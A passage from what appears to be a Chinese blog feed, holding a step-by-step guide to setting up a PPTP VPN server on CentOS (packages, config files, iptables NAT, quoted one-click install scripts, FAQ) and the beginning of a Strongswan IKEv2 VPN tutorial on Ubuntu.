rel="external"><strong>http://poptop.sourceforge.net/yum/stable/packages/</strong></a><br><br>大家下载的时候注意，分清楚你系统的版本是64位的还是32位的。<span style="text-decoration: underline;"><strong>我个人建议ppp用yum安装，pptpd用rpm的安装，因为如果全都rpm或者源码安装，依赖关系很是烦人。文件名含有数字64的就是64位版本，没有的就是32位版本。可以用下面的命令查看自己的系统是32位还是64位的。</strong></span><br>&gt; #getconf LONG_BIT<br>下面假设我这里的ppp是2.4.4版本，然后安装pptpd<br><br><strong>第一种</strong>安装pptpd的方法是直接用yum安装，让电脑自动选择对应的版本：<br><br>先<strong>加入yum源</strong>：<br>&gt; #rpm -Uvh <a href="http://poptop.sourceforge.net/yum/stable/rhel6/pptp-release-current.noarch.rpm" target="_blank" rel="external">http://poptop.sourceforge.net/yum/stable/rhel6/pptp-release-current.noarch.rpm</a><br>然后用yum安装pptpd：<br>&gt; #yum install pptpd<br><strong>这是最省时间和力气的。余下的和手动安装没什么区别了。</strong><br><br>&nbsp;<br><br><strong>第二种</strong>是手动安装pptpd包：<br>&gt; 对于32位CentOS，执行<br>&gt;<br>&gt;<br>&gt; wget <a href="http://acelnmp.googlecode.com/files/pptpd-1.3.4-1.rhel5.1.i386.rpm" target="_blank" rel="external">http://acelnmp.googlecode.com/files/pptpd-1.3.4-1.rhel5.1.i386.rpm</a><br>&gt;<br>&gt;<br>&gt; rpm -ivh pptpd-1.3.4-1.rhel5.1.i386.rpm<br>&gt;<br>&gt;<br>&gt; 对于64位CentOS，执行<br>&gt;<br>&gt;<br>&gt; wget <a href="http://acelnmp.googlecode.com/files/pptpd-1.3.4-1.rhel5.1.x86_64.rpm" target="_blank" rel="external">http://acelnmp.googlecode.com/files/pptpd-1.3.4-1.rhel5.1.x86_64.rpm</a><br>&gt;<br>&gt;<br>&gt; rpm -ivh pptpd-1.3.4-1.rhel5.1.x86_64.rpm<br>&gt;<br>&gt;<br>&gt; 这里贴上32位的pptpd的rpm的下载地址：<br>&gt;<br>&gt;<br>&gt; <a href="http://www.400gb.com/file/34722122" target="_blank" rel="external">http://www.400gb.com/file/34722122</a><br><br>### <a name="t1"></a>64位安装的时候如果出现：<a href="http://www.ksharpdabu.info/?p=2178" target="_blank" rel="external">http://www.ksharpdabu.info/?p=2178</a><br><br>&gt; warning: pptpd-1.3.4-2.rhel5.x86_64.rpm: Header V3 DSA/SHA1 Signature, key ID 862acc42: NOKEY<br>&gt;<br>&gt; error: Failed dependencies:<br>&gt;<br>&gt; <strong>ppp = 2.4.4 is needed by pptpd-1.3.4-2.rhel5.x86_64</strong><br>&gt;<br>&gt;<br>&gt; 原因是pptpd与PPP不兼容，那么，此时用#yum list installed ppp   命令查看ppp版本，极有可能ppp是2.4.5版本的。所以，我们要下载pptp  1.4.0版本才行，而且这里是64位的系统。下载pptpd-1.4.0-1.el6.x86_64.rpm安装即可。这就是我说的出现版本不兼容的问题，当ppp版本和pptpd版本不兼容时候，就会出现类似的错误。<br>&gt;<br>&gt;<br>&gt; 这里我分享下pptpd 下载地址；<br>&gt;<br>&gt;<br>&gt; 64位<strong>pptpd-1.4.0-1.el6.x86_64.rpm</strong>的下载地址：<a href="http://www.400gb.com/file/54124122" target="_blank" rel="external">http://www.pipipan.com/file/18457333</a><br>&gt;<br>&gt;<br>&gt; 32位<strong>pptpd-1.4.0-1.el6.i686.rpm</strong>版本下载地址：<a href="http://www.400gb.com/file/54124192" target="_blank" rel="external">http://www.400gb.com/file/54124192</a><br>&gt;<br>&gt;<br>&gt; 看到有人建议用–nodeps –force 这个参数，我个人不建议，这个参数可能以后会出现奇怪的问题，但是如果实在不行，你就用吧<br>&nbsp;<br><br><strong>第三步：修改配置文件</strong><br><br>1.<strong>配置文件/etc/ppp/options.pptpd</strong><br>&gt; #mv /etc/ppp/options.pptpd /etc/ppp/options.pptpd.bak<br>&gt;<br>&gt; #vi /etc/ppp/options.pptpd<br><strong>options.pptpd</strong>内容如下：<br>&gt; name pptpd<br>&gt;<br>&gt; refuse-pap<br>&gt;<br>&gt; refuse-chap<br>&gt;<br>&gt; refuse-mschap<br>&gt;<br>&gt; require-mschap-v2<br>&gt;<br>&gt; require-mppe-128<br>&gt;<br>&gt; proxyarp<br>&gt;<br>&gt; lock<br>&gt;<br>&gt; nobsdcomp<br>&gt;<br>&gt; novj<br>&gt;<br>&gt; novjccomp<br>&gt;<br>&gt; nologfd<br>&gt;<br>&gt; idle 2592000<br>&gt;<br>&gt; ms-dns 8.8.8.8<br>&gt;<br>&gt; ms-dns 8.8.4.4<br>解析：ms-dns 8.8.8.8， ms-dns 8.8.4.4是使用google的dns服务器。<br><br>2.<strong>配置文件/etc/ppp/chap-secrets</strong><br>&gt; #cp   /etc/ppp/chap-secrets /etc/ppp/chap-secrets.bak<br>&gt;<br>&gt; #vi  /etc/ppp/chap-secrets<br><strong>chap-secrets</strong>内容如下：<br>&gt; # Secrets for authentication using CHAP<br>&gt;<br>&gt; # client server secret IP addresses<br>&gt;<br>&gt; myusername      pptpd     mypassword     <em><br>&gt;<br>&gt;<br>&gt; //myusername是你的vpn帐号，mypassword是你的vpn的密码，</em>表示对任何ip，记得不要丢了这个星号。我这里根据这个格式，假设我的vpn的帐号是ksharpdabu，密码是 sky。那么，应该如下：<br>&gt;<br>&gt;<br>&gt; ksharpdabu pptpd sky <em><br>&nbsp;<br><br>3.<strong>配置文件/etc/pptpd.conf</strong><br><br>#cp   /etc/pptpd.conf /etc/pptpd.conf.bak<br>#vi /etc/pptpd.conf<br><br><strong>pptpd.conf</strong>内容如下：<br>&gt; <strong>option /etc/ppp/options.pptpd</strong><br>&gt;<br>&gt; logwtmp<br>&gt;<br>&gt; localip 192.168.9.1<br>&gt;<br>&gt; remoteip 192.168.9.11-30 //表示vpn客户端获得ip的范围<br>&nbsp;<br><br><strong>关键点：<strong>pptpd.conf这个配置文件必须保证最后是以空行结尾才行，否则会导致启动pptpd服务时，出现“Starting pptpd:”，一直卡着不动的问题，无法启动服务，切记呀！（相关文档可以查看：<a href="http://www.ksharpdabu.info/starting-pptpd-does-not-run-down-turn.html" title="Starting pptpd: 运行不下去的原因(转)" target="_blank" rel="external">Starting pptpd: 运行不下去的原因</a>）</strong></strong><br><br>ppp = 2.4.4 is needed by pptpd-1.3.4-2.rhel5.x86_64<br><br>&nbsp;<br><br>4.<strong>配置文件/etc/sysctl.conf</strong><br>&gt; #vi /etc/sysctl.conf //修改内核设置，使其支持转发<br>将net.ipv4.ip_forward = 0 改成 net.ipv4.ip_forward = 1<br><br>保存修改后的文件<br>&gt; #/sbin/sysctl -p<br>&nbsp;<br><br><strong>第四步：启动pptp vpn服务和iptables</strong><br>&gt; #/sbin/service pptpd start 或者 #service pptpd start<br>经过前面步骤，我们的VPN已经<strong>可以拨号登录</strong>了，但是还不能访问任何网页。最后一步就是添加iptables转发规则了，输入下面的指令：<br><br>启动iptables和nat转发功能，很关键的呀：<br><br>#/sbin/service iptables start //启动iptables<br><br>#/sbin/iptables -t nat -A POSTROUTING -o eth0 -s 192.168.9.0/24 -j MASQUERADE <strong>或者</strong>使用下面的一种：<br><br>#iptables -t nat -A POSTROUTING -o eth0 -s 192.168.9.0/24 -j SNAT –to-source207.210.83.140 //你需要将207.210.83.140替换成你的vps的公网ip地址，因为这里我写的是我的。还有就是有人说我这–to-source前只有一个横杠，其实是有两个横杠的。文章在编辑模式下显示是两个横杠，因为用的是英文输入法，所以，发表后就变成了一个横杆，而且在源码下复制粘贴也是一横，只有在编辑模式下才能看清楚是两横。但是可以明显看到to前面的那一横比source前的那横长一些，这些都是我操作记录下的命令，不会有错的。为了防止你们出错，我还是用不同的颜色标记吧。<br><br>这里我先前写的不是很详细，现在补上：

</em>   需要注意的是，这个指令中的“192.168.9.0/24”是根据之前的配置文件中的“localip”网段来改变的(网上有的教程是192.168.0.0/24 )，比如你设置的 “10.0.0.1”网段，则应该改为“10.0.0.0/24”。此外还有一点需要注意的是eth0，如果你的外网网卡不是eth0，而是eth1（比 如SoftLayer的服务器就是这样的情况），那么请记得将eth0也更改为对应的网卡编号，不然是上不了网的！<br><em>   如果你的linux vps是ppp或者ADSL这种由DHCP动态分配获取ip的方式（当然vps的ip基本都是是固定的。如果你是XEN的vps，那么这个转发规则其实<strong>也是适用</strong>的，就是让vps自己判断自己的ip，省去了我们指定。），那么就需要用-j MASQUERADE这种写法，就是ip伪装。当然如果使用iptables -t nat -A POSTROUTING -o eth0 -s 192.168.9.0/24 -j SNAT –to-source XXX.XXX.XXX.XXX 这种转发规则其实也是可以的，这样亲自指定自己的vps的ip地址。以后你通过vpn访问网站，显示的就是这个ip了。<br>#/etc/init.d/iptables save //保存iptables的转发规则<br><br>#/sbin/service iptables restart //重新启动iptables<br><br>&nbsp;<br><br><strong>最后一步：重启pptp vpn</strong><br>&gt; #/sbin/service pptpd retart 或者 #service pptpd restart<br>#############################################3<br><br>客户端如何拨号登陆vpn，我就不写了，大家可以自行google，因为系统那么多，我不可能xp，win7，centos，mac之类的每个都写，何况网上一大堆，只要你pptp vpn服务器搭建好了，客户端登陆的选择就是简单的事。如果这个也不知道，那我就没法了，自己动手吧。<br><br>&nbsp;<br><br><strong>多余的步骤</strong>：设置pptp vpn 开机启动<br><br>有的人懒的重启后手动开启服务，所以下面我再补上开机自动启动pptp vpn 和 iptables的命令<br><br>#chkconfig pptpd on //开机启动pptp vpn服务<br><br>#chkconfig iptables on //开机启动iptables<br><br>&nbsp;<br><br>有问题请先看log，查google，百度，论坛，有的人连软件下载都不自己去搜索，对于这样的人，我也懒得理睬。<br><br>&nbsp;<br><br>##############################华丽分隔线############################3<br><br>下面贴出网上的别人写的pptp vpn 一键安装包使用方法：<br><br><strong>第一篇：</strong><br>&gt; 本教程仅仅适用于Xen或KVM VPS,不适用于Openvz VPS，安装之前请确定自己是否是符合标准！<br>&gt;<br>&gt;<br>&gt; 1. 下载vpn(CentOS6专用)一键安装包<br>&gt;<br>&gt; #wget <a href="http://www.hi-vps.com/shell/vpn_centos6.sh" target="_blank" rel="external">http://www.hi-vps.com/shell/vpn_centos6.sh</a><br>&gt;<br>&gt; #chmod a+x vpn_centos6.sh<br>&gt;<br>&gt; 2. 运行一键安装包<br>&gt;<br>&gt; #bash vpn_centos6.sh<br>&gt;<br>&gt;<br>&gt; 会有三个选择:<br>&gt;<br>&gt;<br>&gt; 1. 安装VPN服务<br>&gt;<br>&gt; 2. 修复VPN<br>&gt;<br>&gt; 3. 添加VPN用户首先输入1，回车,VPS开始安装VPN服务. VPN服务安装完毕后会默认生成一个用户名为vpn，密码为随机数的用户来。<br>&gt;<br>&gt;<br>&gt; 3. 添加VPN用户<br>&gt;<br>&gt; #bash vpn_centos6.sh选择3，然后输入用户名和密码,OK<br>&gt;<br>&gt;<br>&gt; 4. 修复VPN服务<br>&gt;<br>&gt; 如果VPN拨号发生错误,可以试着修复VPN,然后重启VPS<br>&gt;<br>&gt; #bash vpn_centos6.sh<br>&gt;<br>&gt; 选择2，然后reboot<br>&gt;<br>&gt;<br>&gt; 下面是具体的脚本：<br>&gt;<br>&gt; #!/bin/bash<br>&gt;<br>&gt;<br>&gt; function installVPN(){<br>&gt;<br>&gt; echo “begin to install VPN services”;<br>&gt;<br>&gt; #check wether vps suppot ppp and tun<br>&gt;<br>&gt;<br>&gt; yum remove -y pptpd ppp<br>&gt;<br>&gt; iptables –flush POSTROUTING –table nat<br>&gt;<br>&gt; iptables –flush FORWARD<br>&gt;<br>&gt; rm -rf /etc/pptpd.conf<br>&gt;<br>&gt; rm -rf /etc/ppp<br>&gt;<br>&gt;<br>&gt; arch=<code>uname -m</code><br>&gt;<br>&gt;<br>&gt; wget <a href="http://www.hi-vps.com/downloads/dkms-2.0.17.5-1.noarch.rpm" target="_blank" rel="external">http://www.hi-vps.com/downloads/dkms-2.0.17.5-1.noarch.rpm</a><br>&gt;<br>&gt; wget <a href="http://wty.name/linux/sources/kernel_ppp_mppe-1.0.2-3dkms.noarch.rpm" target="_blank" rel="external">http://wty.name/linux/sources/kernel_ppp_mppe-1.0.2-3dkms.noarch.rpm</a><br>&gt;<br>&gt; wget <a href="http://www.hi-vps.com/downloads/kernel_ppp_mppe-1.0.2-3dkms.noarch.rpm" target="_blank" rel="external">http://www.hi-vps.com/downloads/kernel_ppp_mppe-1.0.2-3dkms.noarch.rpm</a><br>&gt;<br>&gt; wget <a href="http://www.hi-vps.com/downloads/pptpd-1.3.4-2.el6.$arch.rpm" target="_blank" rel="external">http://www.hi-vps.com/downloads/pptpd-1.3.4-2.el6.$arch.rpm</a><br>&gt;<br>&gt; wget <a href="http://www.hi-vps.com/downloads/ppp-2.4.5-17.0.rhel6.$arch.rpm" target="_blank" rel="external">http://www.hi-vps.com/downloads/ppp-2.4.5-17.0.rhel6.$arch.rpm</a><br>&gt;<br>&gt;<br>&gt; yum -y install make libpcap iptables gcc-c++ logrotate tar cpio perl pam tcp_wrappers<br>&gt;<br>&gt; rpm -ivh dkms-2.0.17.5-1.noarch.rpm<br>&gt;<br>&gt; rpm -ivh kernel_ppp_mppe-1.0.2-3dkms.noarch.rpm<br>&gt;<br>&gt; rpm -qa kernel_ppp_mppe<br>&gt;<br>&gt; rpm -Uvh ppp-2.4.5-17.0.rhel6.$arch.rpm<br>&gt;<br>&gt; rpm -ivh pptpd-1.3.4-2.el6.$arch.rpm<br>&gt;<br>&gt;<br>&gt; mknod /dev/ppp c 108 0<br>&gt;<br>&gt; echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br>&gt;<br>&gt; echo “mknod /dev/ppp c 108 0″ &gt;&gt; /etc/rc.local<br>&gt;<br>&gt; echo “echo 1 &gt; /proc/sys/net/ipv4/ip_forward” &gt;&gt; /etc/rc.local<br>&gt;<br>&gt; echo “localip 172.16.36.1″ &gt;&gt; /etc/pptpd.conf<br>&gt;<br>&gt; echo “remoteip 172.16.36.2-254″ &gt;&gt; /etc/pptpd.conf<br>&gt;<br>&gt; echo “ms-dns 8.8.8.8″ &gt;&gt; /etc/ppp/options.pptpd<br>&gt;<br>&gt; echo “ms-dns 8.8.4.4″ &gt;&gt; /etc/ppp/options.pptpd<br>&gt;<br>&gt;<br>&gt; pass=<code>openssl rand 6 -base64</code><br>&gt;<br>&gt; if [ “$1” != “” ]<br>&gt;<br>&gt; then pass=$1<br>&gt;<br>&gt; fi<br>&gt;<br>&gt;<br>&gt; echo “vpn pptpd ${pass} </em>” &gt;&gt; /etc/ppp/chap-secrets<br>&gt;<br>&gt;<br>&gt; iptables -t nat -A POSTROUTING -s 172.16.36.0/24 -j SNAT –to-source <code>ifconfig | grep ‘inet addr:’| grep -v ’127.0.0.1′ | cut -d: -f2 | awk ‘NR==1 { print $1}’</code><br>&gt;<br>&gt; iptables -A FORWARD -p tcp –syn -s 172.16.36.0/24 -j TCPMSS –set-mss 1356<br>&gt;<br>&gt; service iptables save<br>&gt;<br>&gt;<br>&gt; chkconfig iptables on<br>&gt;<br>&gt; chkconfig pptpd on<br>&gt;<br>&gt;<br>&gt; service iptables start<br>&gt;<br>&gt; service pptpd start<br>&gt;<br>&gt;<br>&gt; echo “VPN service is installed, your VPN username is vpn, VPN password is ${pass}”<br>&gt;<br>&gt;<br>&gt; }<br>&gt;<br>&gt;<br>&gt; function repaireVPN(){<br>&gt;<br>&gt; echo “begin to repaire VPN”;<br>&gt;<br>&gt; mknod /dev/ppp c 108 0<br>&gt;<br>&gt; service iptables restart<br>&gt;<br>&gt; service pptpd start<br>&gt;<br>&gt; }<br>&gt;<br>&gt;<br>&gt; function addVPNuser(){<br>&gt;<br>&gt; echo “input user name:”<br>&gt;<br>&gt; read username<br>&gt;<br>&gt; echo “input password:”<br>&gt;<br>&gt; read userpassword<br>&gt;<br>&gt; echo “${username} pptpd ${userpassword} <em>” &gt;&gt; /etc/ppp/chap-secrets<br>&gt;<br>&gt; service iptables restart<br>&gt;<br>&gt; service pptpd start<br>&gt;<br>&gt; }<br>&gt;<br>&gt;<br>&gt; echo “which do you want to?input the number.”<br>&gt;<br>&gt; echo “1. install VPN service”<br>&gt;<br>&gt; echo “2. repaire VPN service”<br>&gt;<br>&gt; echo “3. add VPN user”<br>&gt;<br>&gt; read num<br>&gt;<br>&gt;<br>&gt; case “$num” in<br>&gt;<br>&gt; [1] ) (installVPN);;<br>&gt;<br>&gt; [2] ) (repaireVPN);;<br>&gt;<br>&gt; [3] ) (addVPNuser);;<br>&gt;<br>&gt; </em>) echo “nothing,exit”;;<br>&gt;<br>&gt; esac<br><strong>第二篇：</strong><br>&gt; ## <a name="t2"></a><a href="http://www.centoscn.com/image-text/2013/0413/307.html" target="_blank" rel="external">PPTP VPN 一键安装包（OpenVZ适用）</a><br>&gt;<br>&gt; ### <a name="t3"></a>1、检测<span class="entry">虚拟网卡支持</span><br>&gt;<br>&gt; OpenVZ的VPS客户需要检测<span class="entry">虚拟网卡ppp模块支持，</span><span class="entry">如果不支持即使安装成功也没用。（Xen等可跳过此步）</span><br>&gt;<br>&gt;<br>&gt; #### <a name="t4"></a>检测是否支持ppp模块<br>&gt;<br>&gt; 执行命令：<br>&gt;<br>&gt; <pre lang="bash">cat /dev/ppp</pre><br>&gt;<br>&gt; 如果返回信息为：cat: /dev/ppp: No such device or address 说明正常<br>&gt;<br>&gt;<br>&gt; ### <a name="t5"></a>2、使用管理员帐号密码登陆SSH，并输入以下指令<br>&gt;<br>&gt; wget <a href="http://soft.kwx.gd/vpn/pptpd.sh" target="_blank" rel="external">http://soft.kwx.gd/vpn/pptpd.sh</a> //下载centos pptp vpn一键安装包的脚本<br>&gt;<br>&gt;<br>&gt; ### <a name="t6"></a><span class="entry">3、以上操作是下载安装脚本，下载完毕后请直接执行：</span><br>&gt;<br>&gt; sh pptpd.sh<br>&gt;<br>&gt;<br>&gt; ### <a name="t7"></a>安装完成后，默认账户是vpn ，密码:vpn 如果要添加修改密码，参考我上面的教程<span class="entry">输入命令 vi /etc/ppp/chap-secrets 编辑文件，按照相同格式添加用户名和密码即可。</span><span class="entry">：</span><br>&gt;<br>&gt; <strong>chap-secrets</strong>内容如下：<br>&gt;<br>&gt;<br>&gt; # Secrets for authentication using CHAP<br>&gt;<br>&gt; # client server secret IP addresses<br>&gt;<br>&gt; myusername pptpd mypassword <em><br>&gt;<br>&gt;<br>&gt; //myusername是你的vpn帐号，mypassword是你的vpn的密码，</em>表示对任何ip，记得不要丢了这个星号。我这里根据这个格式，假设我的vpn的帐号是ksharpdabu，密码是 sky。那么，应该如下：<br>&gt;<br>&gt;<br>&gt; ksharpdabu pptpd sky <em><br></em></div><br><div></div><br><div>############################完#############################</div><br><div>如果一件安装包都不知道用，那就真的没法子了</div><br><div><br><br><em>*FAQ：</em><br><br>1.报错：重启时候提示<br><br># service pptpd restart<br>Shutting down pptpd: [失败]<br>Starting pptpd: [失败]<br>Warning: a pptpd restart does not terminate existing<br>connections, so new connections may be assigned the same IP<br>address and cause unexpected results. Use restart-kill to<br>destroy existing connections during a restart.<br><br>解决办法：根据提示，可能是你重启pptpd服务的时候，没有切断已经存在的连接，所以新的连接会被分配为相同的ip地址，导致一些不可预料的问题。所以你重启 pptpd服务前，先用下面的命令断开当前存在的连接：#service pptpd restart-kill，然后再#service pptpd start<br><br>2.有的vps不支持加密连接，导致不能拨号成功登陆vpn。<br><br>解决办法：是<span class="entry">编辑/etc/ppp/options.pptpd（vim /etc/ppp/options.pptpd），在require-mppe-128前面加个#（# require-mppe-128）；</span><br><br><span class="entry">在windows的VPN连接属性里，加密方式选择为可选加密，并允许未加密的密码。</span><br><br>&nbsp;<br><br>3.能够直接用域名作为vpn的拨号地址，而不用vps的ip。因为ip不方便记忆，我自己也记不住自己的服务器的ip。<br><br>解决办法：去dns里面设置，将域名设置为A记录，这样就可以直接用域名作为vpn的服务器的地址了。<br><br>4.有的链接 pptp vpn时候失败，提示619.<br><br>解决办法：执行下面的命令：<br><br># rm -r /dev/ppp<br><br># mknod /dev/ppp c 108 0 然后重启VPS即可。<br><br>也可以参考这片文章《<a href="http://www.hkcdn.net/23.html" target="_blank" rel="external">VPN连接时提示619错误处理办法及vpn连接成功后无法上网解决办法</a>》<br><br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[使用Strongswan搭建IPSec/IKEv2 VPN]]></title>
      <url>http://www.linux52.com/2015-04-26-e4-bd-bf-e7-94-a8strongswan-e6-90-ad-e5-bb-baipsecikev2-vpn.html</url>
      <content type="html"><![CDATA[<p>本来Strongswan搭建IKEv2 VPN有一篇很好的教程（在nsshell.com上），但是貌似nsshell.com貌似挂了（反正我打不开），于是我就做个搬运，把教程拿过来。。正好原文中有一两处遗漏，我也好补上去。</p>
<p><strong>重要说明：本文原本只是给自己留一个参考，但似乎已经有很多人参考了这篇文章。一个月来我已经人工帮助了将近10个人无偿排查疑难问题。而作为一个学生，并没有多余的经历做这些事情。因此以后请不要找我问如何搭建VPN，谢谢。</strong></p>
<p>条件：<br>RAM大小合适的VPS或者服务器（96MB RAM就足够了，64MB RAM未测试）<br>可以是OpenVZ，但注意看教程中标注的针对OpenVZ的特殊步骤。</p>
<p>1.准备工作<br>请在虚拟机或服务器上安装好Ubuntu操作系统，32位、64位均可，建议14.04 LTS，并执行以下命令：</p>
<pre><code>apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; update
apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; install libpam0g-dev libssl-dev make gcc
`&lt;/pre&gt;
将PAM库和SSL库安装在系统中

2.下载最新的strongswan源代码并编译
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;wget&lt;/span&gt; [&lt;span class=&quot;hljs-url&quot;&gt;http://download.strongswan.org/strongswan.tar.gz&lt;/span&gt;](http://download.strongswan.org/strongswan.tar.gz)
tar xzf strongswan.tar.gz
cd strongswan-*
`&lt;/pre&gt;
OpenVZ使用以下参数
&lt;pre class=&quot;  language-markup&quot;&gt;`./configure  --enable-eap-identity --enable-eap-md5 \
--enable-eap-mschapv2 --enable-eap-tls --enable-eap-ttls --enable-eap-peap  \
--enable-eap-tnc --enable-eap-&lt;span class=&quot;hljs-keyword&quot;&gt;dynamic&lt;/span&gt; --enable-eap-radius --enable-xauth-eap  \
--enable-xauth-pam  --enable-dhcp  --enable-openssl  --enable-addrblock --enable-unity  \
--enable-certexpire --enable-radattr --enable-tools --enable-openssl --disable-gmp --enable-kernel-libipsec
`&lt;/pre&gt;
其它服务器执行
&lt;pre class=&quot;  language-markup&quot;&gt;`./configure  --enable-eap-identity --enable-eap-md5 \
--enable-eap-mschapv2 --enable-eap-tls --enable-eap-ttls --enable-eap-peap  \
--enable-eap-tnc --enable-eap-&lt;span class=&quot;hljs-keyword&quot;&gt;dynamic&lt;/span&gt; --enable-eap-radius --enable-xauth-eap  \
--enable-xauth-pam  --enable-dhcp  --enable-openssl  --enable-addrblock --enable-unity  \
--enable-certexpire --enable-radattr --enable-tools --enable-openssl --disable-gmp
`&lt;/pre&gt;
等待这个过程结束后，执行以下命令：
&lt;pre class=&quot;  language-markup&quot;&gt;`make; make install
`&lt;/pre&gt;
耐心地等待编译，性能不同编译所需时间也有所不同。

完成后使用命令`ipsec version`检查是否出现版本号等信息，如下图
![](https://hjc.im/content/images/2014/11/Capture.PNG)
若出现`ipsec: command not found`则代表没有成功编译安装。

3.配置strongswan和证书

生成CA证书
生成私钥
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --gen --outform pem &amp;gt; ca.pem  
`&lt;/pre&gt;
利用私钥，签名CA证书
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --self --in ca.pem --dn &lt;span class=&quot;hljs-string&quot;&gt;&quot;C=com, O=myvpn, CN=VPN CA&quot;&lt;/span&gt; --ca --outform pem &amp;gt;ca.cert.pem
`&lt;/pre&gt;
服务器证书 生成私钥
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --gen --outform pem &amp;gt; server.pem
`&lt;/pre&gt;
用CA证书签发服务器证书

首先确认访问服务器的IP地址或域名，连接时**不可使用其它地址，只能使用证书中的地址，请将下面一句命令中的123.123.123.123替换为自己服务器的IP地址或域名，连接时使用**，一共需要替换**两处**。
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --pub --in server.pem | ipsec pki --issue --cacert ca.cert.pem \
--cakey ca.pem --dn &lt;span class=&quot;hljs-string&quot;&gt;&quot;C=com, O=myvpn, CN=123.123.123.123&quot;&lt;/span&gt; \
--san=&lt;span class=&quot;hljs-string&quot;&gt;&quot;123.123.123.123&quot;&lt;/span&gt; --flag serverAuth --flag ikeIntermediate \
--outform pem &amp;gt; server.cert.pem
`&lt;/pre&gt;
客户端证书 生成私钥
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --gen --outform pem &amp;gt; client.pem
`&lt;/pre&gt;
利用CA签名客户端证书
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;ipsec&lt;/span&gt; pki --pub --in client.pem | ipsec pki --issue --cacert ca.cert.pem --cakey ca.pem --dn &lt;span class=&quot;hljs-string&quot;&gt;&quot;C=com, O=myvpn, CN=VPN Client&quot;&lt;/span&gt; --outform pem &amp;gt; client.cert.pem
`&lt;/pre&gt;
生成pkcs12证书
&lt;pre class=&quot;  language-markup&quot;&gt;`openssl pkcs12 -&lt;span class=&quot;hljs-keyword&quot;&gt;export&lt;/span&gt; -inkey client.pem -&lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; client.cert.pem -name &lt;span class=&quot;hljs-string&quot;&gt;&quot;client&quot;&lt;/span&gt; -certfile ca.cert.pem -caname &lt;span class=&quot;hljs-string&quot;&gt;&quot;VPN CA&quot;&lt;/span&gt;  -out client.cert.p12
`&lt;/pre&gt;
安装证书
&lt;pre class=&quot;  language-markup&quot;&gt;`cp -r ca.cert.pem /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/cacerts/
cp -r server.cert.pem /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/certs/
cp -r server.pem /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/private/
cp -r client.cert.pem /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/certs/
cp -r client.pem  /usr/&lt;span class=&quot;hljs-built_in&quot;&gt;local&lt;/span&gt;/etc/ipsec.d/private/
`&lt;/pre&gt;
证书安装完成，接下来配置strongswan，编辑`/usr/local/etc/ipsec.conf`
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;config&lt;/span&gt; setup
    uniqueids=never 

conn iOS_cert
    keyexchange=ikev1
    &lt;span class=&quot;hljs-comment&quot;&gt;# strongswan version &amp;gt;= 5.0.2, compatible with iOS 6.0,6.0.1&lt;/span&gt;
    fragmentation=&lt;span class=&quot;hljs-built_in&quot;&gt;yes&lt;/span&gt;
    left=%defaultroute
    leftauth=pubkey
    leftsubnet=&lt;span class=&quot;hljs-number&quot;&gt;0.0.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;
    leftcert=server.cert.pem
    right=%any
    rightauth=pubkey
    rightauth2=xauth
    rightsourceip=&lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
    rightcert=client.cert.pem
    auto=add

conn android_xauth_psk
    keyexchange=ikev1
    left=%defaultroute
    leftauth=psk
    leftsubnet=&lt;span class=&quot;hljs-number&quot;&gt;0.0.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;
    right=%any
    rightauth=psk
    rightauth2=xauth
    rightsourceip=&lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
    auto=add

conn networkmanager-strongswan
    keyexchange=ikev2
    left=%defaultroute
    leftauth=pubkey
    leftsubnet=&lt;span class=&quot;hljs-number&quot;&gt;0.0.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;
    leftcert=server.cert.pem
    right=%any
    rightauth=pubkey
    rightsourceip=&lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
    rightcert=client.cert.pem
    auto=add

conn windows7
    keyexchange=ikev2
    ike=aes256-sha1-modp1024! 
    rekey=&lt;span class=&quot;hljs-built_in&quot;&gt;no&lt;/span&gt;
    left=%defaultroute
    leftauth=pubkey
    leftsubnet=&lt;span class=&quot;hljs-number&quot;&gt;0.0.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;
    leftcert=server.cert.pem
    right=%any
    rightauth=eap-mschapv2
    rightsourceip=&lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;
    rightsendcert=never
    eap_identity=%any
    auto=add
`&lt;/pre&gt;
编辑`/usr/local/etc/strongswan.conf`
